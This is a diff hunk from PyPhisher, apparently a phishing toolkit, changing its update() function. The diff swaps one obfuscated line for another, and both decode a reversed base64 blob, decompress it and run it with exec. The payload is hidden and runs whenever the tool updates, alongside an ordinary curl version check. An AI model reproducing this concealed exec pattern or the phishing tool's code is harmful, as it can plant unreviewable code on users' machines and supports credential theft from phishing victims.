@@ -240,7 +240,7 @@ def killer():
 # Update of PyPhisher
 def update():
     internet()
-    _ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=kCKpgCAHwvswAfMwjUDdKLCHr2kaK1nbOZYFvLsparY8zUCySAUJnFLI3aSixdpmXGpx+28TLvcYNam00fFqsw8SWh8KVhKKqEFLJv8VIfXEqKCfkPfKlSTvosDs4E9inIZWDDYmThhGZkZmShpU5tYmzmxUYsQDrwYBEWliAkcFTMAsDEzDAkZLxJe'))
+    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=UhGYtKAu00QNIBzKStsw2UJFRFl8TehcQM1SKupwy3ll0mI8LqoU3oE8ysoCKugAIl40WT10Sl0UpUKN9iyOwiTyDV0Lx8yLd9zPlMyR9yyIPFTLzJe'))
     git_ver=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").read().strip()
     if (version != git_ver and git_ver != "404: Not Found"):
         changelog=popen("curl -s -N https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").read()
